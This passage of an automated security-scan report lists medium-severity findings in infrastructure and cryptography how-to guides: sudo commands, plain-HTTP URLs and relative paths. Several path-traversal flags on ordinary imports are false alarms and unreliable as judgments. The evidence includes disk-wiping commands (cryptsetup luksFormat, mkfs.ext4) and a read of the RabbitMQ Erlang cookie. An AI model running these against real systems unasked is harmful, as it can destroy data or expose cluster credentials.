        "file": "skills/cloud/gcp/gcp-storage.md",
        "line_number": 256,
        "issue": "Privilege escalation",
        "evidence": "sudo apt-get install nfs-common",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cloud/gcp/gcp-storage.md",
        "line_number": 257,
        "issue": "Privilege escalation",
        "evidence": "sudo mkdir -p /mnt/shared",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cloud/gcp/gcp-storage.md",
        "line_number": 258,
        "issue": "Privilege escalation",
        "evidence": "sudo mount 10.0.0.2:/data /mnt/shared  # Use IP from filestore instance",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cloud/gcp/gcp-storage.md",
        "line_number": 261,
        "issue": "Privilege escalation",
        "evidence": "echo \"10.0.0.2:/data /mnt/shared nfs defaults 0 0\" | sudo tee -a /etc/fstab",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud/kubernetes-deployment/resources/REFERENCE.md",
        "line_number": 1623,
        "issue": "Unencrypted HTTP",
        "evidence": "url: http://flagger-loadtester/",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud/kubernetes-deployment/resources/REFERENCE.md",
        "line_number": 1626,
        "issue": "Unencrypted HTTP",
        "evidence": "cmd: \"hey -z 1m -q 10 -c 2 http://myapp/\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud/kubernetes-deployment/resources/REFERENCE.md",
        "line_number": 3696,
        "issue": "Unencrypted HTTP",
        "evidence": "serverAddress: http://prometheus.monitoring.svc.cluster.local:9090",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud/kubernetes-deployment/resources/REFERENCE.md",
        "line_number": 4383,
        "issue": "Unencrypted HTTP",
        "evidence": "kubectl run -it --rm debug --image=curlimages/curl --restart=Never -- curl http://<service-name>",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/testing/integration-testing/resources/REFERENCE.md",
        "line_number": 1070,
        "issue": "Path traversal pattern",
        "evidence": "import { app } from '../app';",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/testing/e2e-testing/resources/REFERENCE.md",
        "line_number": 2706,
        "issue": "Path traversal pattern",
        "evidence": "import { LoginPage } from '../../pages/LoginPage';",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/testing/e2e-testing/resources/REFERENCE.md",
        "line_number": 2775,
        "issue": "Path traversal pattern",
        "evidence": "import { LoginPage } from '../pages/LoginPage';",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/testing/e2e-testing/resources/REFERENCE.md",
        "line_number": 2776,
        "issue": "Path traversal pattern",
        "evidence": "import { DashboardPage } from '../pages/DashboardPage';",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/testing/e2e-testing/resources/REFERENCE.md",
        "line_number": 3851,
        "issue": "Path traversal pattern",
        "evidence": "import { ProductPage } from '../pages/ProductPage';",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/testing/e2e-testing/resources/REFERENCE.md",
        "line_number": 3852,
        "issue": "Path traversal pattern",
        "evidence": "import { CartPage } from '../pages/CartPage';",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/testing/e2e-testing/resources/REFERENCE.md",
        "line_number": 3853,
        "issue": "Path traversal pattern",
        "evidence": "import { CheckoutPage } from '../pages/CheckoutPage';",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/testing/e2e-testing/resources/REFERENCE.md",
        "line_number": 3898,
        "issue": "Path traversal pattern",
        "evidence": "import { test as authTest } from '../fixtures/auth';",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/realtime/websocket-implementation.md",
        "line_number": 456,
        "issue": "Unencrypted HTTP",
        "evidence": "const url = new URL(req.url!, `http://${req.headers.host}`);",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/realtime/websocket-implementation/resources/REFERENCE.md",
        "line_number": 1168,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://websocket_backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/caching/cdn-edge-caching.md",
        "line_number": 632,
        "issue": "Unencrypted HTTP",
        "evidence": "for url_element in root.findall('.//{http://www.sitemaps.org/schemas/sitemap/0.9}loc'):",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/protocols/websocket-protocols.md",
        "line_number": 281,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://websocket_backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/websocket-protocols.md",
        "line_number": 610,
        "issue": "Path traversal pattern",
        "evidence": "cd ../examples/docker",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/mqtt-messaging.md",
        "line_number": 440,
        "issue": "Privilege escalation",
        "evidence": "sudo apt-get install mosquitto mosquitto-clients",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/mqtt-messaging.md",
        "line_number": 829,
        "issue": "Path traversal pattern",
        "evidence": "./validate_mqtt_config.py --config ../examples/mosquitto/mosquitto.conf --json",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/mqtt-messaging.md",
        "line_number": 839,
        "issue": "Path traversal pattern",
        "evidence": "cd ../examples",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/mqtt-messaging.md",
        "line_number": 860,
        "issue": "Path traversal pattern",
        "evidence": "cd ../scripts",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/kafka-streams.md",
        "line_number": 859,
        "issue": "Path traversal pattern",
        "evidence": "cd ../examples/docker",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/kafka-streams.md",
        "line_number": 870,
        "issue": "Path traversal pattern",
        "evidence": "cd ../examples/python",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/protobuf-schemas.md",
        "line_number": 739,
        "issue": "Path traversal pattern",
        "evidence": "./validate_proto_schemas.py --proto-file ../examples/user_service.proto --json",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/protobuf-schemas.md",
        "line_number": 744,
        "issue": "Path traversal pattern",
        "evidence": "./generate_proto_code.py --proto-file ../examples/user_service.proto --languages python,go --output-dir ./gen",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/protobuf-schemas.md",
        "line_number": 749,
        "issue": "Path traversal pattern",
        "evidence": "./analyze_schema_compatibility.py --old ../examples/schema_evolution/v1.proto --new ../examples/schema_evolution/v2.proto",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/grpc-implementation.md",
        "line_number": 813,
        "issue": "Path traversal pattern",
        "evidence": "./validate_proto.py --proto-file ../examples/protos/service.proto --json",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/grpc-implementation.md",
        "line_number": 818,
        "issue": "Path traversal pattern",
        "evidence": "./generate_client.py --proto-file ../examples/protos/service.proto --language python --output-dir ./client",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/grpc-implementation.md",
        "line_number": 823,
        "issue": "Path traversal pattern",
        "evidence": "cd ../examples",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/grpc-implementation.md",
        "line_number": 844,
        "issue": "Path traversal pattern",
        "evidence": "./test_grpc_server.sh --server localhost:50051 --proto-file ../examples/protos/service.proto --json",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/protocols/kafka-streams/resources/examples/README.md",
        "line_number": 128,
        "issue": "Unencrypted HTTP",
        "evidence": "docker-compose exec ksqldb-cli ksql http://ksqldb-server:8088",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/protocols/mqtt-messaging/resources/REFERENCE.md",
        "line_number": 1461,
        "issue": "Unencrypted HTTP",
        "evidence": "auth.http.auth_req.url = http://auth-service/mqtt/auth",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/mqtt-messaging/resources/REFERENCE.md",
        "line_number": 1546,
        "issue": "Privilege escalation",
        "evidence": "sudo apt-get update",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/mqtt-messaging/resources/REFERENCE.md",
        "line_number": 1547,
        "issue": "Privilege escalation",
        "evidence": "sudo apt-get install mosquitto mosquitto-clients",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/protocols/mqtt-messaging/resources/REFERENCE.md",
        "line_number": 2280,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://mqtt;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/protocols/mqtt-messaging/resources/REFERENCE.md",
        "line_number": 3075,
        "issue": "Unencrypted HTTP",
        "evidence": "prometheus.push.gateway.server = http://pushgateway:9091",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 1586,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl start rabbitmq-server",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 1589,
        "issue": "Privilege escalation",
        "evidence": "sudo cat /var/lib/rabbitmq/.erlang.cookie",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 1595,
        "issue": "Privilege escalation",
        "evidence": "echo \"COOKIEVALUE\" | sudo tee /var/lib/rabbitmq/.erlang.cookie",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 1596,
        "issue": "Privilege escalation",
        "evidence": "sudo chmod 400 /var/lib/rabbitmq/.erlang.cookie",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 1597,
        "issue": "Privilege escalation",
        "evidence": "sudo chown rabbitmq:rabbitmq /var/lib/rabbitmq/.erlang.cookie",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 1600,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl start rabbitmq-server",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 1603,
        "issue": "Privilege escalation",
        "evidence": "sudo rabbitmqctl stop_app",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 1604,
        "issue": "Privilege escalation",
        "evidence": "sudo rabbitmqctl reset",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 1605,
        "issue": "Privilege escalation",
        "evidence": "sudo rabbitmqctl join_cluster rabbit@ubuntu1",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 1606,
        "issue": "Privilege escalation",
        "evidence": "sudo rabbitmqctl start_app",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 1612,
        "issue": "Privilege escalation",
        "evidence": "sudo rabbitmqctl stop_app",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 1613,
        "issue": "Privilege escalation",
        "evidence": "sudo rabbitmqctl reset",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 1614,
        "issue": "Privilege escalation",
        "evidence": "sudo rabbitmqctl join_cluster rabbit@ubuntu1",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 1615,
        "issue": "Privilege escalation",
        "evidence": "sudo rabbitmqctl start_app",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 1620,
        "issue": "Privilege escalation",
        "evidence": "sudo rabbitmqctl cluster_status",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 3112,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl status rabbitmq-server",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 3115,
        "issue": "Privilege escalation",
        "evidence": "sudo netstat -tlnp | grep 5672",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 3124,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl start rabbitmq-server",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/protocols/resources/amqp-rabbitmq/REFERENCE.md",
        "line_number": 3127,
        "issue": "Privilege escalation",
        "evidence": "sudo ufw allow 5672/tcp",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/sni-routing.md",
        "line_number": 69,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -i any -A 'tcp port 443' | grep -i \"server_name\"",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/sni-routing.md",
        "line_number": 89,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend1;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/sni-routing.md",
        "line_number": 102,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend2;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/sni-routing.md",
        "line_number": 115,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend3;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/sni-routing.md",
        "line_number": 138,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://$backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/sni-routing.md",
        "line_number": 288,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://$subdomain-backend:8080;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 111,
        "issue": "Unencrypted HTTP",
        "evidence": "<Signature xmlns=\"http://www.w3.org/2000/09/xmldsig#\">",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 114,
        "issue": "Unencrypted HTTP",
        "evidence": "<SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\"/>",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 116,
        "issue": "Unencrypted HTTP",
        "evidence": "<DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\"/>",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 163,
        "issue": "Force flag usage",
        "evidence": "--force \\",
        "recommendation": "Ensure user understands consequences"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 191,
        "issue": "Unencrypted HTTP",
        "evidence": "/tr http://timestamp.digicert.com /td SHA256 \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 242,
        "issue": "Privilege escalation",
        "evidence": "sudo mv cosign-linux-amd64 /usr/local/bin/cosign",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 327,
        "issue": "Unencrypted HTTP",
        "evidence": "http://timestamp.digicert.com > response.tsr",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 335,
        "issue": "Unencrypted HTTP",
        "evidence": "- DigiCert: `http://timestamp.digicert.com`",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 336,
        "issue": "Unencrypted HTTP",
        "evidence": "- Sectigo: `http://timestamp.sectigo.com`",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 443,
        "issue": "Unencrypted HTTP",
        "evidence": "wget http://crl.example.com/revoked.crl",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 454,
        "issue": "Unencrypted HTTP",
        "evidence": "-url http://ocsp.example.com \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 565,
        "issue": "Unencrypted HTTP",
        "evidence": "signtool sign /tr http://timestamp.digicert.com /td SHA256 app.exe",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 613,
        "issue": "Unencrypted HTTP",
        "evidence": "openssl ocsp -issuer ca.pem -cert cert.pem -url http://ocsp.example.com",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 781,
        "issue": "Path traversal pattern",
        "evidence": "cd ../examples/python",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 788,
        "issue": "Path traversal pattern",
        "evidence": "cd ../",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 838,
        "issue": "Unencrypted HTTP",
        "evidence": "signtool sign /f cert.pfx /p password /tr http://timestamp.digicert.com /td SHA256 app.exe",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest.md",
        "line_number": 265,
        "issue": "Privilege escalation",
        "evidence": "sudo fdesetup enable",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/encryption-at-rest.md",
        "line_number": 621,
        "issue": "Path traversal pattern",
        "evidence": "cd ../examples/python",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/encryption-at-rest.md",
        "line_number": 628,
        "issue": "Path traversal pattern",
        "evidence": "cd ../",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/tls-configuration.md",
        "line_number": 129,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/tls-configuration.md",
        "line_number": 319,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/certificate-management.md",
        "line_number": 65,
        "issue": "Privilege escalation",
        "evidence": "sudo apt install certbot python3-certbot-nginx",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/certificate-management.md",
        "line_number": 74,
        "issue": "Privilege escalation",
        "evidence": "sudo certbot certonly --webroot \\",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/certificate-management.md",
        "line_number": 87,
        "issue": "Privilege escalation",
        "evidence": "sudo certbot --nginx -d example.com -d www.example.com",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/certificate-management.md",
        "line_number": 99,
        "issue": "Privilege escalation",
        "evidence": "sudo certbot certonly --manual \\",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/certificate-management.md",
        "line_number": 111,
        "issue": "Privilege escalation",
        "evidence": "sudo certbot renew --dry-run",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/certificate-management.md",
        "line_number": 186,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl enable --now certbot-renew.timer",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/certificate-management.md",
        "line_number": 187,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl list-timers certbot-renew.timer",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/certificate-management.md",
        "line_number": 748,
        "issue": "Path traversal pattern",
        "evidence": "cd ../examples/python",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/certificate-management.md",
        "line_number": 755,
        "issue": "Path traversal pattern",
        "evidence": "cd ../",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/pki-fundamentals.md",
        "line_number": 243,
        "issue": "Unencrypted HTTP",
        "evidence": "-url http://ocsp.example.com -CAfile ca-cert.pem",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1062,
        "issue": "Privilege escalation",
        "evidence": "sudo cryptsetup luksFormat /dev/sdb1",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1065,
        "issue": "Privilege escalation",
        "evidence": "sudo cryptsetup luksOpen /dev/sdb1 encrypted_disk",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1068,
        "issue": "Privilege escalation",
        "evidence": "sudo mkfs.ext4 /dev/mapper/encrypted_disk",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1071,
        "issue": "Privilege escalation",
        "evidence": "sudo mount /dev/mapper/encrypted_disk /mnt/encrypted",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1074,
        "issue": "Privilege escalation",
        "evidence": "echo \"encrypted_disk /dev/sdb1 none luks\" | sudo tee -a /etc/crypttab",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1077,
        "issue": "Privilege escalation",
        "evidence": "echo \"/dev/mapper/encrypted_disk /mnt/encrypted ext4 defaults 0 2\" | sudo tee -a /etc/fstab",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1083,
        "issue": "Privilege escalation",
        "evidence": "sudo cryptsetup luksAddKey /dev/sdb1",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1086,
        "issue": "Privilege escalation",
        "evidence": "sudo cryptsetup luksRemoveKey /dev/sdb1",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1089,
        "issue": "Privilege escalation",
        "evidence": "sudo cryptsetup luksHeaderBackup /dev/sdb1 --header-backup-file luks-header-backup",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 1092,
        "issue": "Privilege escalation",
        "evidence": "sudo cryptsetup luksHeaderRestore /dev/sdb1 --header-backup-file luks-header-backup",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
